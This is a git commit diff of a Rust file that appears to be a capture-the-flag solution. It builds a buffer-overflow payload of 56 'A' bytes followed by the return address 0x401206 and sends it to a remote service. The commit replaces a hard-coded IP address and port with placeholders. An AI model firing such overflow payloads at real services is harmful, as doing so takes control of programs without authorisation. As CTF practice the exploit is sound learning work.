3faf40cbec2a33ea0509f96a0e5367421bb04097
numonce <89475906+numonce@users.noreply.github.com>
2022-06-03 17:37:36 -0400

    Update main.rs

--- src/main.rs
+++ src/main.rs
@@ -3,7 +3,7 @@ fn main() -> Result<(),Box<dyn std::error::Error>>{
     init_logger();
     let mut payload = b"A".repeat(56);
     payload.append(&mut p64(0x0000000000401206));
-    let mut target = Remote::new("68.183.45.211", 32401).unwrap();
+    let mut target = Remote::new("your_IP_here", CHANGE_ME_TO_PORT).unwrap();
     let prompt = target.recv()?;
     println!("{}",String::from_utf8_lossy(&prompt));
     target.sendline(payload)?;
